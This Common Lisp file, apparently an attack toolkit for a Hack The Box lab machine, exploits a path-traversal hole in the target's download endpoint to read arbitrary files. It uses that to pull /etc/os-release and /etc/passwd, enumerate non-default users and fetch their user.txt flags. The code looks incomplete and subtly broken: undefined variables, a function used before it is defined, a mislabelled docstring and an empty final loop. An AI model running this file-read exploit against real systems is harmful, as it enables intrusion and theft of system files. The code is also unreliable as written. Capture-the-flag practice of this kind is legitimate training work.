(defpackage grimoire
  (:use #:cl)
  (:local-nicknames (:a :alexandria)))
(in-package #:grimoire)

(defparameter *default-users* (load-data "default-users.txt"))
(defparameter *interesting-files* (load-data "interesting-files.txt"))

(defparameter *capacities* (make-hash-table :test #'equal))

;; Machine functions

(defun titanic/read-file (path)
  (let* ((url (format nil "http://titanic.htb/download?ticket=../../../../~a" path))
         (res (dex:get url)))
    (handler-case (trivial-utf-8:utf-8-bytes-to-string res)
      (error (c) res))))

;; Generic functions

(defun load-data (system-relative-path)
  "load a data/file.txt into a list"
  (remove-if #'alexandria:emptyp 
             (str:lines 
              (alexandria:read-file-into-string
               (asdf:system-relative-pathname
                :grimoire (merge-pathnames "data/" system-relative-path))))))

(defmacro grm/defun (name capacities parameters &body body)
  "create a function and check capacities at the start"
  `(defun ,name ,parameters
     ,@(loop for c in capacities
             collect `(grm/can ,c))
     
     ,@body))

(defun grm/can (type)
  "check if we have a capacity"
  (assert (not (null (gethash type *capacities*)))
          nil
          (format nil "Missing capacity for ~a" type)))

(defun grm/register (type function)
  "register a function as a capacity"
  (setf (gethash type *capacities*) function))

(defun grm/read-into-string (path)
  "read a file"
  (funcall *read-function* path))

(defun grm/download (path name)
  "read a file"
  (ignore-errors 
    (a:write-byte-vector-into-file 
     (funcall *read-function* path)
     (merge-pathnames 
      (asdf:system-relative-pathname
       :grimoire (merge-pathnames "output/" name))))
    t))

(grm/defun grm/system-info (:read) ()
           "list all the users from /etc/passwd"
           (grm/read-into-string "/etc/os-release"))

(grm/defun grm/all-users (:read) ()
           "list all the users from /etc/passwd"
           (loop for line in (str:lines (grm/read-into-string "/etc/passwd"))
                 if (not (alexandria:emptyp line))
                 collect (car (str:split ":" line))))

(grm/defun grm/users (:read) ()
           "list the users that are not default"
           (let ((all-users (grm/all-users)))
             (remove-if #'(lambda (u) (member u *default-users* :test #'equal)) 
                        all-users)))

(grm/defun grm/user-flag (:read) ()
           (loop for user in (grm/users)
                 return (str:trim 
                         (grm/read-into-string
                          (format nil "/home/~a/user.txt" user)))))

(grm/defun interesting-files (:read) ()
           (loop for path in *interesting-paths*))